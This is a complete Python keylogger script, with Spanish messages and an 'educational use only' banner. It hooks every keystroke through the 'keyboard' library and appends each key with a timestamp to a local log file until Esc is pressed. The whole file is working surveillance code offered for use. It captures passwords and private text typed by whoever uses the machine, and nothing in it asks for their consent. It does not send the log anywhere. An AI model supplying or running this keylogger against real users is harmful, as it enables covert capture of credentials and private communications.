import keyboard
import time
import os


LOG_FILE = "log.txt"

def on_key_event(event):
  
    if event.event_type == keyboard.KEY_DOWN:
        key_name = event.name
        
        
        log_entry = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Tecla: '{key_name}'\n"
        

        if len(key_name) > 1:
            log_entry = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [{key_name.upper()}]\n"
        
        print(f"Registrando: {log_entry.strip()}") 
        
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except Exception as e:
      
            print(f"[!] Error al escribir en el archivo de log: {e}")

def main():
 
   
    GREEN = '\033[92m'
    RESET = '\033[0m'


    print(GREEN + r"""
  __        _______ _      ____ ___  __  __ _____    _ __     _    _  _____ _______________
  \ \      / / ____| |    / ___/ _ \| \/  | ____|  | |/ /    / \  | |/ / _ \__ /__ /__ /
   \ \ /\ / /| _| | |   | |  | | | | |\/| | _|     | ' /    / _ \ | ' / | | |/ /  / /  / /
    \ V  V / | |___| |__| |__| |_| | |  | | |___   | . \   / ___ \| . \ |_| / /_ / /_ / /_
     \_/\_/  |_____|_____\____\___/|_|  |_|_____|  |_|\_\/_/   \_\_|\_\___/____/____/____|
""" + RESET)

    print(GREEN + "USAR SOLO CON FINES EDUCATIVOS" + RESET)
    
    print(f"\n[+] Keylogger iniciado. Presiona 'Esc' para detener.")
    print(f"[+] Los logs se guardarán en: {os.path.abspath(LOG_FILE)}")

    try:
      
        keyboard.hook(on_key_event)
        
 
        keyboard.wait('esc')
        
    except KeyboardInterrupt:
        print("\n[!] Detención por interrupción de teclado (Ctrl+C).")
    except Exception as e:
        print(f"\n[!] Ocurrió un error: {e}")
    finally:
        keyboard.unhook_all()
        print("\n[+] Keylogger detenido. Revisar el archivo de log.")

if __name__ == "__main__":

    main()
